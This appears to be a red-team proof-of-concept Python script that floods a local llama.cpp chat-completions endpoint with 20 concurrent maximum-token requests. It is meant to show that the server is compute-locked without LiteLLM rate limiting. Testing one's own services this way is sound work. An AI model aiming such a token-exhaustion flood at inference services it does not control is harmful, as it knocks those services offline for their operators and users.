import requests
import threading
import time

print("🔴 [RED TEAM] Launching Inference DoS Attack (Token Exhaustion)...")

def hammer_endpoint():
    url = "http://localhost:11435/v1/chat/completions"
    payload = {
        "messages": [{"role": "user", "content": "Write a 10,000 word essay on the history of the universe."}],
        "max_tokens": 8192
    }
    try:
        requests.post(url, json=payload)
    except Exception as e:
        pass

# Launch 20 concurrent threads directly at the unprotected llama.cpp port
start_time = time.time()
threads = []
for _ in range(20):
    t = threading.Thread(target=hammer_endpoint)
    t.start()
    threads.append(t)

for t in threads:
    t.join()

print(f"💥 [VULNERABILITY PROVED] Flooded the inference engine with 20 concurrent maximum-context requests in {time.time() - start_time:.2f} seconds.")
print("Without LiteLLM rate limiting, the local host is now compute-locked.")